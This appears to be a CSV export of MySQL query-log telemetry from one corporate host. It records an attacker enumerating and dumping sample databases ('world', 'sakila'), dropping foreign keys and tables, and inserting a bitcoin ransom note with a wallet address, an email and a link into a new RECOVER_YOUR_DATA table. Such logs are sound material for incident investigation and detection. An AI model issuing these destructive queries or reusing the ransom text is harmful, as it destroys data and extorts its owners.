TimeGenerated,DeviceName,ActionType,Query,RawData
"Aug 14, 2026 6:20:38 PM",corp-na01-bp123na,Query, USE `world`,2026-08-15T00:20:38.415505Z    93 Query USE `world`
"Aug 14, 2026 6:20:38 PM",corp-na01-bp123na,Query, SHOW TABLES,2026-08-15T00:20:38.504891Z    93 Query SHOW TABLES
"Aug 14, 2026 6:20:38 PM",corp-na01-bp123na,Query, SELECT * FROM countrylanguage LIMIT 10,2026-08-15T00:20:38.305222Z    99 Query SELECT * FROM countrylanguage LIMIT 10
"Aug 14, 2026 6:20:38 PM",corp-na01-bp123na,Query," SELECT TABLE_NAME, COLUMN_NAME, CONSTRAINT_NAME, REFERENCED_TABLE_NAME, REFERENCED_COLUMN_NAME FROM information_schema.KEY_COLUMN_USAGE WHERE TABLE_SCHEMA = 'world' AND TABLE_NAME = 'countrylanguage' AND REFERENCED_TABLE_NAME IS NOT NULL","2026-08-15T00:20:38.605343Z    93 Query SELECT TABLE_NAME, COLUMN_NAME, CONSTRAINT_NAME, REFERENCED_TABLE_NAME, REFERENCED_COLUMN_NAME FROM information_schema.KEY_COLUMN_USAGE WHERE TABLE_SCHEMA = 'world' AND TABLE_NAME = 'countrylanguage' AND REFERENCED_TABLE_NAME IS NOT NULL"
"Aug 14, 2026 6:20:38 PM",corp-na01-bp123na,Query, ALTER TABLE `countrylanguage` DROP FOREIGN KEY `countryLanguage_ibfk_1`,2026-08-15T00:20:38.695543Z    93 Query ALTER TABLE `countrylanguage` DROP FOREIGN KEY `countryLanguage_ibfk_1`
"Aug 14, 2026 6:20:37 PM",corp-na01-bp123na,Query," SELECT engine, table_type FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = DATABASE() AND table_name = 'countrylanguage'","2026-08-15T00:20:37.183047Z    98 Query SELECT engine, table_type FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = DATABASE() AND table_name = 'countrylanguage'"
"Aug 14, 2026 6:20:37 PM",corp-na01-bp123na,Query, SHOW VARIABLES LIKE 'lower_case_table_names',2026-08-15T00:20:36.994152Z    98 Query SHOW VARIABLES LIKE 'lower_case_table_names'
"Aug 14, 2026 6:20:37 PM",corp-na01-bp123na,Query," SELECT engine, table_type FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = DATABASE() AND table_name = 'countrylanguage'","2026-08-15T00:20:37.276938Z    98 Query SELECT engine, table_type FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = DATABASE() AND table_name = 'countrylanguage'"
"Aug 14, 2026 6:20:37 PM",corp-na01-bp123na,Query, set optimizer_switch=default,2026-08-15T00:20:36.808128Z    98 Query set optimizer_switch=default
"Aug 14, 2026 6:20:37 PM",corp-na01-bp123na,Query," select column_name, extra, generation_expression, data_type from information_schema.columns where table_schema=database() and table_name='countrylanguage' order by ordinal_position","2026-08-15T00:20:37.463971Z    98 Query select column_name, extra, generation_expression, data_type from information_schema.columns where table_schema=database() and table_name='countrylanguage' order by ordinal_position"
"Aug 14, 2026 6:20:37 PM",corp-na01-bp123na,Query," SELECT /*!40001 SQL_NO_CACHE */ `CountryCode`, `Language`, `IsOfficial`, `Percentage` FROM `countrylanguage` WHERE 1 LIMIT 10","2026-08-15T00:20:37.557613Z    98 Query SELECT /*!40001 SQL_NO_CACHE */ `CountryCode`, `Language`, `IsOfficial`, `Percentage` FROM `countrylanguage` WHERE 1 LIMIT 10"
"Aug 14, 2026 6:20:37 PM",corp-na01-bp123na,Query, SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = DATABASE() AND table_name = 'countrylanguage',2026-08-15T00:20:37.088142Z    98 Query SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = DATABASE() AND table_name = 'countrylanguage'
"Aug 14, 2026 6:20:37 PM",corp-na01-bp123na,Query," SELECT DISTINCT TABLESPACE_NAME, FILE_NAME, LOGFILE_GROUP_NAME, EXTENT_SIZE, INITIAL_SIZE, ENGINE FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'DATAFILE' AND TABLESPACE_NAME IN (SELECT DISTINCT TABLESPACE_NAME FROM INFORMATION_SCHEMA.PARTITIONS WHERE TABLE_SCHEMA='world' AND TABLE_NAME IN ('countrylanguage')) ORDER BY TABLESPACE_NAME, LOGFILE_GROUP_NAME","2026-08-15T00:20:36.714257Z    98 Query SELECT DISTINCT TABLESPACE_NAME, FILE_NAME, LOGFILE_GROUP_NAME, EXTENT_SIZE, INITIAL_SIZE, ENGINE FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'DATAFILE' AND TABLESPACE_NAME IN (SELECT DISTINCT TABLESPACE_NAME FROM INFORMATION_SCHEMA.PARTITIONS WHERE TABLE_SCHEMA='world' AND TABLE_NAME IN ('countrylanguage')) ORDER BY TABLESPACE_NAME, LOGFILE_GROUP_NAME"
"Aug 14, 2026 6:20:37 PM",corp-na01-bp123na,Query, SET SQL_QUOTE_SHOW_CREATE=1,2026-08-15T00:20:37.370971Z    98 Query SET SQL_QUOTE_SHOW_CREATE=1
"Aug 14, 2026 6:20:36 PM",corp-na01-bp123na,Query, /*M!100100 SET WAIT_TIMEOUT=DEFAULT */,2026-08-15T00:20:36.429202Z    98 Query /*M!100100 SET WAIT_TIMEOUT=DEFAULT */
"Aug 14, 2026 6:20:36 PM",corp-na01-bp123na,Query, set optimizer_switch='semijoin=off',2026-08-15T00:20:36.522126Z    98 Query set optimizer_switch='semijoin=off'
"Aug 14, 2026 6:20:36 PM",corp-na01-bp123na,Query, /*!40100 SET @@SQL_MODE='' */,2026-08-15T00:20:36.243480Z    98 Query /*!40100 SET @@SQL_MODE='' */
"Aug 14, 2026 6:20:36 PM",corp-na01-bp123na,Query," SELECT LOGFILE_GROUP_NAME, FILE_NAME, TOTAL_EXTENTS, INITIAL_SIZE, ENGINE, EXTRA FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'UNDO LOG' AND FILE_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IN (SELECT DISTINCT LOGFILE_GROUP_NAME FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'DATAFILE' AND TABLESPACE_NAME IN (SELECT DISTINCT TABLESPACE_NAME FROM INFORMATION_SCHEMA.PARTITIONS WHERE TABLE_SCHEMA='world' AND TABLE_NAME IN ('countrylanguage'))) GROUP BY LOGFILE_GROUP_NAME, FILE_NAME, ENGINE, TOTAL_EXTENTS, INITIAL_SIZE ORDER BY LOGFILE_GROUP_NAME","2026-08-15T00:20:36.619257Z    98 Query SELECT LOGFILE_GROUP_NAME, FILE_NAME, TOTAL_EXTENTS, INITIAL_SIZE, ENGINE, EXTRA FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'UNDO LOG' AND FILE_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IN (SELECT DISTINCT LOGFILE_GROUP_NAME FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'DATAFILE' AND TABLESPACE_NAME IN (SELECT DISTINCT TABLESPACE_NAME FROM INFORMATION_SCHEMA.PARTITIONS WHERE TABLE_SCHEMA='world' AND TABLE_NAME IN ('countrylanguage'))) GROUP BY LOGFILE_GROUP_NAME, FILE_NAME, ENGINE, TOTAL_EXTENTS, INITIAL_SIZE ORDER BY LOGFILE_GROUP_NAME"
"Aug 14, 2026 6:20:36 PM",corp-na01-bp123na,Query, /*M!100100 SET @@MAX_STATEMENT_TIME=0.000000 */,2026-08-15T00:20:36.336405Z    98 Query /*M!100100 SET @@MAX_STATEMENT_TIME=0.000000 */
"Aug 14, 2026 6:20:35 PM",corp-na01-bp123na,Query, SELECT * FROM country LIMIT 10,2026-08-15T00:20:35.512246Z    97 Query SELECT * FROM country LIMIT 10
"Aug 14, 2026 6:20:34 PM",corp-na01-bp123na,Query, SHOW VARIABLES LIKE 'lower_case_table_names',2026-08-15T00:20:34.195111Z    96 Query SHOW VARIABLES LIKE 'lower_case_table_names'
"Aug 14, 2026 6:20:34 PM",corp-na01-bp123na,Query," select column_name, extra, generation_expression, data_type from information_schema.columns where table_schema=database() and table_name='country' order by ordinal_position","2026-08-15T00:20:34.663412Z    96 Query select column_name, extra, generation_expression, data_type from information_schema.columns where table_schema=database() and table_name='country' order by ordinal_position"
"Aug 14, 2026 6:20:34 PM",corp-na01-bp123na,Query," SELECT /*!40001 SQL_NO_CACHE */ `Code`, `Name`, `Continent`, `Region`, `SurfaceArea`, `IndepYear`, `Population`, `LifeExpectancy`, `GNP`, `GNPOld`, `LocalName`, `GovernmentForm`, `HeadOfState`, `Capital`, `Code2` FROM `country` WHERE 1 LIMIT 10","2026-08-15T00:20:34.757010Z    96 Query SELECT /*!40001 SQL_NO_CACHE */ `Code`, `Name`, `Continent`, `Region`, `SurfaceArea`, `IndepYear`, `Population`, `LifeExpectancy`, `GNP`, `GNPOld`, `LocalName`, `GovernmentForm`, `HeadOfState`, `Capital`, `Code2` FROM `country` WHERE 1 LIMIT 10"
"Aug 14, 2026 6:20:34 PM",corp-na01-bp123na,Query, set optimizer_switch=default,2026-08-15T00:20:34.009568Z    96 Query set optimizer_switch=default
"Aug 14, 2026 6:20:34 PM",corp-na01-bp123na,Query, SET SQL_QUOTE_SHOW_CREATE=1,2026-08-15T00:20:34.570432Z    96 Query SET SQL_QUOTE_SHOW_CREATE=1
"Aug 14, 2026 6:20:34 PM",corp-na01-bp123na,Query," SELECT engine, table_type FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = DATABASE() AND table_name = 'country'","2026-08-15T00:20:34.382956Z    96 Query SELECT engine, table_type FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = DATABASE() AND table_name = 'country'"
"Aug 14, 2026 6:20:34 PM",corp-na01-bp123na,Query, SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = DATABASE() AND table_name = 'country',2026-08-15T00:20:34.289188Z    96 Query SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = DATABASE() AND table_name = 'country'
"Aug 14, 2026 6:20:34 PM",corp-na01-bp123na,Query," SELECT engine, table_type FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = DATABASE() AND table_name = 'country'","2026-08-15T00:20:34.476576Z    96 Query SELECT engine, table_type FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = DATABASE() AND table_name = 'country'"
"Aug 14, 2026 6:20:34 PM",corp-na01-bp123na,Query," SELECT DISTINCT TABLESPACE_NAME, FILE_NAME, LOGFILE_GROUP_NAME, EXTENT_SIZE, INITIAL_SIZE, ENGINE FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'DATAFILE' AND TABLESPACE_NAME IN (SELECT DISTINCT TABLESPACE_NAME FROM INFORMATION_SCHEMA.PARTITIONS WHERE TABLE_SCHEMA='world' AND TABLE_NAME IN ('country')) ORDER BY TABLESPACE_NAME, LOGFILE_GROUP_NAME","2026-08-15T00:20:33.915138Z    96 Query SELECT DISTINCT TABLESPACE_NAME, FILE_NAME, LOGFILE_GROUP_NAME, EXTENT_SIZE, INITIAL_SIZE, ENGINE FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'DATAFILE' AND TABLESPACE_NAME IN (SELECT DISTINCT TABLESPACE_NAME FROM INFORMATION_SCHEMA.PARTITIONS WHERE TABLE_SCHEMA='world' AND TABLE_NAME IN ('country')) ORDER BY TABLESPACE_NAME, LOGFILE_GROUP_NAME"
"Aug 14, 2026 6:20:33 PM",corp-na01-bp123na,Query," SELECT LOGFILE_GROUP_NAME, FILE_NAME, TOTAL_EXTENTS, INITIAL_SIZE, ENGINE, EXTRA FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'UNDO LOG' AND FILE_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IN (SELECT DISTINCT LOGFILE_GROUP_NAME FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'DATAFILE' AND TABLESPACE_NAME IN (SELECT DISTINCT TABLESPACE_NAME FROM INFORMATION_SCHEMA.PARTITIONS WHERE TABLE_SCHEMA='world' AND TABLE_NAME IN ('country'))) GROUP BY LOGFILE_GROUP_NAME, FILE_NAME, ENGINE, TOTAL_EXTENTS, INITIAL_SIZE ORDER BY LOGFILE_GROUP_NAME","2026-08-15T00:20:33.819450Z    96 Query SELECT LOGFILE_GROUP_NAME, FILE_NAME, TOTAL_EXTENTS, INITIAL_SIZE, ENGINE, EXTRA FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'UNDO LOG' AND FILE_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IN (SELECT DISTINCT LOGFILE_GROUP_NAME FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'DATAFILE' AND TABLESPACE_NAME IN (SELECT DISTINCT TABLESPACE_NAME FROM INFORMATION_SCHEMA.PARTITIONS WHERE TABLE_SCHEMA='world' AND TABLE_NAME IN ('country'))) GROUP BY LOGFILE_GROUP_NAME, FILE_NAME, ENGINE, TOTAL_EXTENTS, INITIAL_SIZE ORDER BY LOGFILE_GROUP_NAME"
"Aug 14, 2026 6:20:33 PM",corp-na01-bp123na,Query, /*M!100100 SET @@MAX_STATEMENT_TIME=0.000000 */,2026-08-15T00:20:33.541184Z    96 Query /*M!100100 SET @@MAX_STATEMENT_TIME=0.000000 */
"Aug 14, 2026 6:20:33 PM",corp-na01-bp123na,Query, /*!40100 SET @@SQL_MODE='' */,2026-08-15T00:20:33.448485Z    96 Query /*!40100 SET @@SQL_MODE='' */
"Aug 14, 2026 6:20:33 PM",corp-na01-bp123na,Query, set optimizer_switch='semijoin=off',2026-08-15T00:20:33.726708Z    96 Query set optimizer_switch='semijoin=off'
"Aug 14, 2026 6:20:33 PM",corp-na01-bp123na,Query, /*M!100100 SET WAIT_TIMEOUT=DEFAULT */,2026-08-15T00:20:33.633872Z    96 Query /*M!100100 SET WAIT_TIMEOUT=DEFAULT */
"Aug 14, 2026 6:20:32 PM",corp-na01-bp123na,Query, SELECT * FROM city LIMIT 10,2026-08-15T00:20:32.775192Z    95 Query SELECT * FROM city LIMIT 10
"Aug 14, 2026 6:20:32 PM",corp-na01-bp123na,Query," SELECT /*!40001 SQL_NO_CACHE */ `ID`, `Name`, `CountryCode`, `District`, `Population` FROM `city` WHERE 1 LIMIT 10","2026-08-15T00:20:32.027997Z    94 Query SELECT /*!40001 SQL_NO_CACHE */ `ID`, `Name`, `CountryCode`, `District`, `Population` FROM `city` WHERE 1 LIMIT 10"
"Aug 14, 2026 6:20:32 PM",corp-na01-bp123na,Query," select column_name, extra, generation_expression, data_type from information_schema.columns where table_schema=database() and table_name='city' order by ordinal_position","2026-08-15T00:20:31.938093Z    94 Query select column_name, extra, generation_expression, data_type from information_schema.columns where table_schema=database() and table_name='city' order by ordinal_position"
"Aug 14, 2026 6:20:31 PM",corp-na01-bp123na,Query, set optimizer_switch='semijoin=off',2026-08-15T00:20:31.035357Z    94 Query set optimizer_switch='semijoin=off'
"Aug 14, 2026 6:20:31 PM",corp-na01-bp123na,Query, /*M!100100 SET WAIT_TIMEOUT=DEFAULT */,2026-08-15T00:20:30.945410Z    94 Query /*M!100100 SET WAIT_TIMEOUT=DEFAULT */
"Aug 14, 2026 6:20:31 PM",corp-na01-bp123na,Query," SELECT engine, table_type FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = DATABASE() AND table_name = 'city'","2026-08-15T00:20:31.667918Z    94 Query SELECT engine, table_type FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = DATABASE() AND table_name = 'city'"
"Aug 14, 2026 6:20:31 PM",corp-na01-bp123na,Query, SHOW VARIABLES LIKE 'lower_case_table_names',2026-08-15T00:20:31.487093Z    94 Query SHOW VARIABLES LIKE 'lower_case_table_names'
"Aug 14, 2026 6:20:31 PM",corp-na01-bp123na,Query," SELECT LOGFILE_GROUP_NAME, FILE_NAME, TOTAL_EXTENTS, INITIAL_SIZE, ENGINE, EXTRA FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'UNDO LOG' AND FILE_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IN (SELECT DISTINCT LOGFILE_GROUP_NAME FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'DATAFILE' AND TABLESPACE_NAME IN (SELECT DISTINCT TABLESPACE_NAME FROM INFORMATION_SCHEMA.PARTITIONS WHERE TABLE_SCHEMA='world' AND TABLE_NAME IN ('city'))) GROUP BY LOGFILE_GROUP_NAME, FILE_NAME, ENGINE, TOTAL_EXTENTS, INITIAL_SIZE ORDER BY LOGFILE_GROUP_NAME","2026-08-15T00:20:31.124952Z    94 Query SELECT LOGFILE_GROUP_NAME, FILE_NAME, TOTAL_EXTENTS, INITIAL_SIZE, ENGINE, EXTRA FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'UNDO LOG' AND FILE_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IN (SELECT DISTINCT LOGFILE_GROUP_NAME FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'DATAFILE' AND TABLESPACE_NAME IN (SELECT DISTINCT TABLESPACE_NAME FROM INFORMATION_SCHEMA.PARTITIONS WHERE TABLE_SCHEMA='world' AND TABLE_NAME IN ('city'))) GROUP BY LOGFILE_GROUP_NAME, FILE_NAME, ENGINE, TOTAL_EXTENTS, INITIAL_SIZE ORDER BY LOGFILE_GROUP_NAME"
"Aug 14, 2026 6:20:31 PM",corp-na01-bp123na,Query, SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = DATABASE() AND table_name = 'city',2026-08-15T00:20:31.578039Z    94 Query SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = DATABASE() AND table_name = 'city'
"Aug 14, 2026 6:20:31 PM",corp-na01-bp123na,Query, SET SQL_QUOTE_SHOW_CREATE=1,2026-08-15T00:20:31.848716Z    94 Query SET SQL_QUOTE_SHOW_CREATE=1
"Aug 14, 2026 6:20:31 PM",corp-na01-bp123na,Query," SELECT DISTINCT TABLESPACE_NAME, FILE_NAME, LOGFILE_GROUP_NAME, EXTENT_SIZE, INITIAL_SIZE, ENGINE FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'DATAFILE' AND TABLESPACE_NAME IN (SELECT DISTINCT TABLESPACE_NAME FROM INFORMATION_SCHEMA.PARTITIONS WHERE TABLE_SCHEMA='world' AND TABLE_NAME IN ('city')) ORDER BY TABLESPACE_NAME, LOGFILE_GROUP_NAME","2026-08-15T00:20:31.216980Z    94 Query SELECT DISTINCT TABLESPACE_NAME, FILE_NAME, LOGFILE_GROUP_NAME, EXTENT_SIZE, INITIAL_SIZE, ENGINE FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'DATAFILE' AND TABLESPACE_NAME IN (SELECT DISTINCT TABLESPACE_NAME FROM INFORMATION_SCHEMA.PARTITIONS WHERE TABLE_SCHEMA='world' AND TABLE_NAME IN ('city')) ORDER BY TABLESPACE_NAME, LOGFILE_GROUP_NAME"
"Aug 14, 2026 6:20:31 PM",corp-na01-bp123na,Query, set optimizer_switch=default,2026-08-15T00:20:31.308244Z    94 Query set optimizer_switch=default
"Aug 14, 2026 6:20:31 PM",corp-na01-bp123na,Query," SELECT engine, table_type FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = DATABASE() AND table_name = 'city'","2026-08-15T00:20:31.758843Z    94 Query SELECT engine, table_type FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = DATABASE() AND table_name = 'city'"
"Aug 14, 2026 6:20:30 PM",corp-na01-bp123na,Query, USE `world`,2026-08-15T00:20:29.962090Z    93 Query USE `world`
"Aug 14, 2026 6:20:30 PM",corp-na01-bp123na,Query, /*!40100 SET @@SQL_MODE='' */,2026-08-15T00:20:30.766769Z    94 Query /*!40100 SET @@SQL_MODE='' */
"Aug 14, 2026 6:20:30 PM",corp-na01-bp123na,Query, SHOW tables,2026-08-15T00:20:30.052185Z    93 Query SHOW tables
"Aug 14, 2026 6:20:30 PM",corp-na01-bp123na,Query, /*M!100100 SET @@MAX_STATEMENT_TIME=0.000000 */,2026-08-15T00:20:30.856018Z    94 Query /*M!100100 SET @@MAX_STATEMENT_TIME=0.000000 */
"Aug 14, 2026 6:20:30 PM",corp-na01-bp123na,Query, SELECT SUM(data_length + index_length) FROM information_schema.tables WHERE table_schema = 'world',2026-08-15T00:20:29.870267Z    93 Query SELECT SUM(data_length + index_length) FROM information_schema.tables WHERE table_schema = 'world'
"Aug 14, 2026 6:20:29 PM",corp-na01-bp123na,Query, SET AUTOCOMMIT=0,2026-08-15T00:20:29.342207Z    92 Query SET AUTOCOMMIT=0
"Aug 14, 2026 6:20:29 PM",corp-na01-bp123na,Query, COMMIT,2026-08-15T00:20:28.946961Z    45 Query COMMIT
"Aug 14, 2026 6:20:29 PM",corp-na01-bp123na,Query, SET AUTOCOMMIT=0,2026-08-15T00:20:29.780096Z    93 Query SET AUTOCOMMIT=0
"Aug 14, 2026 6:20:28 PM",corp-na01-bp123na,Query, INSERT INTO RECOVER_YOUR_DATA (text) VALUES (' (for more information visit https://bit.ly/22mysql) After payment send mail to ak+2ne16@onionmail.org and we will provide a link for you to download your data. Your DATAID is: 2NE16'),2026-08-15T00:20:28.854212Z    45 Query INSERT INTO RECOVER_YOUR_DATA (text) VALUES (' (for more information visit https://bit.ly/22mysql) After payment send mail to ak+2ne16@onionmail.org and we will provide a link for you to download your data. Your DATAID is: 2NE16')
"Aug 14, 2026 6:20:28 PM",corp-na01-bp123na,Query, CREATE TABLE IF NOT EXISTS RECOVER_YOUR_DATA (text VARCHAR(255)),2026-08-15T00:20:28.618620Z    45 Query CREATE TABLE IF NOT EXISTS RECOVER_YOUR_DATA (text VARCHAR(255))
"Aug 14, 2026 6:20:28 PM",corp-na01-bp123na,Query, DROP TABLE `store`,2026-08-15T00:20:28.406303Z    45 Query DROP TABLE `store`
"Aug 14, 2026 6:20:28 PM",corp-na01-bp123na,Query," SELECT TABLE_NAME, COLUMN_NAME, CONSTRAINT_NAME, REFERENCED_TABLE_NAME, REFERENCED_COLUMN_NAME FROM information_schema.KEY_COLUMN_USAGE WHERE TABLE_SCHEMA = 'sakila' AND TABLE_NAME = 'actor_info' AND REFERENCED_TABLE_NAME IS NOT NULL","2026-08-15T00:20:28.219104Z    45 Query SELECT TABLE_NAME, COLUMN_NAME, CONSTRAINT_NAME, REFERENCED_TABLE_NAME, REFERENCED_COLUMN_NAME FROM information_schema.KEY_COLUMN_USAGE WHERE TABLE_SCHEMA = 'sakila' AND TABLE_NAME = 'actor_info' AND REFERENCED_TABLE_NAME IS NOT NULL"
"Aug 14, 2026 6:20:28 PM",corp-na01-bp123na,Query," SELECT TABLE_NAME, COLUMN_NAME, CONSTRAINT_NAME, REFERENCED_TABLE_NAME, REFERENCED_COLUMN_NAME FROM information_schema.KEY_COLUMN_USAGE WHERE TABLE_SCHEMA = 'sakila' AND TABLE_NAME = 'address' AND REFERENCED_TABLE_NAME IS NOT NULL","2026-08-15T00:20:28.016574Z    45 Query SELECT TABLE_NAME, COLUMN_NAME, CONSTRAINT_NAME, REFERENCED_TABLE_NAME, REFERENCED_COLUMN_NAME FROM information_schema.KEY_COLUMN_USAGE WHERE TABLE_SCHEMA = 'sakila' AND TABLE_NAME = 'address' AND REFERENCED_TABLE_NAME IS NOT NULL"
"Aug 14, 2026 6:20:28 PM",corp-na01-bp123na,Query," SELECT TABLE_NAME, COLUMN_NAME, CONSTRAINT_NAME, REFERENCED_TABLE_NAME, REFERENCED_COLUMN_NAME FROM information_schema.KEY_COLUMN_USAGE WHERE TABLE_SCHEMA = 'sakila' AND TABLE_NAME = 'category' AND REFERENCED_TABLE_NAME IS NOT NULL","2026-08-15T00:20:27.923031Z    45 Query SELECT TABLE_NAME, COLUMN_NAME, CONSTRAINT_NAME, REFERENCED_TABLE_NAME, REFERENCED_COLUMN_NAME FROM information_schema.KEY_COLUMN_USAGE WHERE TABLE_SCHEMA = 'sakila' AND TABLE_NAME = 'category' AND REFERENCED_TABLE_NAME IS NOT NULL"
"Aug 14, 2026 6:20:28 PM",corp-na01-bp123na,Query," INSERT INTO RECOVER_YOUR_DATA (text) VALUES ('All your data was backed up by us. You must pay 0.0135 bitcoin to bc1q7jps5432akuflg9flw2vu6hgmmj5hrrdu6c5gm or in 48 hours, your data will be publicly disclosed and deleted. ')","2026-08-15T00:20:28.760720Z    45 Query INSERT INTO RECOVER_YOUR_DATA (text) VALUES ('All your data was backed up by us. You must pay 0.0135 bitcoin to bc1q7jps5432akuflg9flw2vu6hgmmj5hrrdu6c5gm or in 48 hours, your data will be publicly disclosed and deleted. ')"
"Aug 14, 2026 6:20:28 PM",corp-na01-bp123na,Query, DROP TABLE `staff_list`,2026-08-15T00:20:28.523937Z    45 Query DROP TABLE `staff_list`
"Aug 14, 2026 6:20:28 PM",corp-na01-bp123na,Query," SELECT TABLE_NAME, COLUMN_NAME, CONSTRAINT_NAME, REFERENCED_TABLE_NAME, REFERENCED_COLUMN_NAME FROM information_schema.KEY_COLUMN_USAGE WHERE TABLE_SCHEMA = 'sakila' AND TABLE_NAME = 'actor' AND REFERENCED_TABLE_NAME IS NOT NULL","2026-08-15T00:20:28.312478Z    45 Query SELECT TABLE_NAME, COLUMN_NAME, CONSTRAINT_NAME, REFERENCED_TABLE_NAME, REFERENCED_COLUMN_NAME FROM information_schema.KEY_COLUMN_USAGE WHERE TABLE_SCHEMA = 'sakila' AND TABLE_NAME = 'actor' AND REFERENCED_TABLE_NAME IS NOT NULL"
"Aug 14, 2026 6:20:28 PM",corp-na01-bp123na,Query, ALTER TABLE `address` DROP FOREIGN KEY `fk_address_city`,2026-08-15T00:20:28.112355Z    45 Query ALTER TABLE `address` DROP FOREIGN KEY `fk_address_city`
"Aug 14, 2026 6:20:27 PM",corp-na01-bp123na,Query, ALTER TABLE `film` DROP FOREIGN KEY `fk_film_language`,2026-08-15T00:20:27.115547Z    45 Query ALTER TABLE `film` DROP FOREIGN KEY `fk_film_language`
"Aug 14, 2026 6:20:27 PM",corp-na01-bp123na,Query," SELECT TABLE_NAME, COLUMN_NAME, CONSTRAINT_NAME, REFERENCED_TABLE_NAME, REFERENCED_COLUMN_NAME FROM information_schema.KEY_COLUMN_USAGE WHERE TABLE_SCHEMA = 'sakila' AND TABLE_NAME = 'customer_list' AND REFERENCED_TABLE_NAME IS NOT NULL","2026-08-15T00:20:27.224822Z    45 Query SELECT TABLE_NAME, COLUMN_NAME, CONSTRAINT_NAME, REFERENCED_TABLE_NAME, REFERENCED_COLUMN_NAME FROM information_schema.KEY_COLUMN_USAGE WHERE TABLE_SCHEMA = 'sakila' AND TABLE_NAME = 'customer_list' AND REFERENCED_TABLE_NAME IS NOT NULL"
"Aug 14, 2026 6:20:27 PM",corp-na01-bp123na,Query, ALTER TABLE `city` DROP FOREIGN KEY `fk_city_country`,2026-08-15T00:20:27.812601Z    45 Query ALTER TABLE `city` DROP FOREIGN KEY `fk_city_country`
"Aug 14, 2026 6:20:27 PM",corp-na01-bp123na,Query, ALTER TABLE `film` DROP FOREIGN KEY `fk_film_language_original`,2026-08-15T00:20:27.007170Z    45 Query ALTER TABLE `film` DROP FOREIGN KEY `fk_film_language_original`
